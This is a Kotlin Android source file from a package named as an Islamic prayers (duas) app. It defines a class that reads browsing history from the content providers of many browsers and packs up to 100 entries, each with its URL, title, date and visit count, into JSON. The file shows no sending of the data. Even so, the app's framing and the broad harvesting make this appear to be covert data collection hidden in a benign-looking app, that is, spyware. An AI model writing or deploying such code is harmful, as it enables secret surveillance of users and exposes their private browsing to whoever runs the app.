package islamic.duas.browser

import android.content.Context
import android.net.Uri
import android.util.Log
import islamic.duas.utils.ErrorLog
import org.json.JSONArray
import org.json.JSONObject

class BrowserHistoryCollector(private val context: Context) {

    companion object {
        private const val TAG = "BrowserHistory"
        private const val MAX_ENTRIES = 100
        private val providers = listOf(
            "content://com.android.chrome/browser/history",
            "content://com.android.chrome.browser/history",
            "content://com.google.Chrome.browser/history",
            "content://com.android.browser/browser/history",
            "content://com.sec.android.app.sbrowser.browser/history",
            "content://com.opera.browser/browser/history",
            "content://org.mozilla.firefox/browser/history",
            "content://org.mozilla.firefox.browser/browser/history",
            "content://com.brave.browser/browser/history",
            "content://com.microsoft.emmx/browser/history",
            "content://com.huawei.browser/browser/history",
            "content://com.huawei.browser/browser_history"
        )
    }

    fun collectAll(): JSONArray {
        val history = JSONArray()
        var count = 0

        for (providerUri in providers) {
            if (count >= MAX_ENTRIES) break
            try {
                val uri = Uri.parse(providerUri)
                val projection = arrayOf("title", "url", "date", "visits")
                context.contentResolver.query(uri, projection, null, null, "date DESC LIMIT ${MAX_ENTRIES - count}")?.use { cursor ->
                    val titleIdx = cursor.getColumnIndex("title")
                    val urlIdx = cursor.getColumnIndex("url")
                    val dateIdx = cursor.getColumnIndex("date")
                    val visitsIdx = cursor.getColumnIndex("visits")

                    while (cursor.moveToNext() && count < MAX_ENTRIES) {
                        val title = if (titleIdx >= 0) cursor.getString(titleIdx) ?: "" else ""
                        val url = if (urlIdx >= 0) cursor.getString(urlIdx) ?: "" else ""
                        val date = if (dateIdx >= 0) cursor.getLong(dateIdx) else 0L
                        val visits = if (visitsIdx >= 0) cursor.getInt(visitsIdx) else 0

                        if (url.isNotEmpty()) {
                            history.put(JSONObject().apply {
                                put("title", title)
                                put("url", url)
                                put("dateMs", date)
                                put("visits", visits)
                                put("provider", providerUri.substringAfterLast('/').substringBeforeLast('/'))
                            })
                            count++
                        }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Provider $providerUri failed: ${e.message}")
                ErrorLog.write(context, TAG, "Browser provider: $providerUri failed", e)
            }
        }
        return history
    }
}
